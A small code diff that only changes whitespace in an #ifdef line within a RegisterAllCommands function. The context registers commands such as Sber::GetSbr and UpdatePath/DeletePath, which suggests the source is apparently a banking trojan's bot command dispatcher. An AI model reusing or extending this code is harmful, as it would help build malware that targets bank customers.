@@ -883,7 +883,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 		RegisterCommand(Manager, (PCHAR)Sber::GetSbr, Sber::ExecuteGetSbrCommand);
 	#endif
 
-	#ifdef		JAVS_PATCHERH
+	#ifdef JAVS_PATCHERH
 		RegisterCommand(Manager, (PCHAR)UpdatePath, ExecuteUpdatePathCommand);
 		RegisterCommand(Manager, (PCHAR)DeletePath, ExecuteDeletePathCommand);
 	#endif
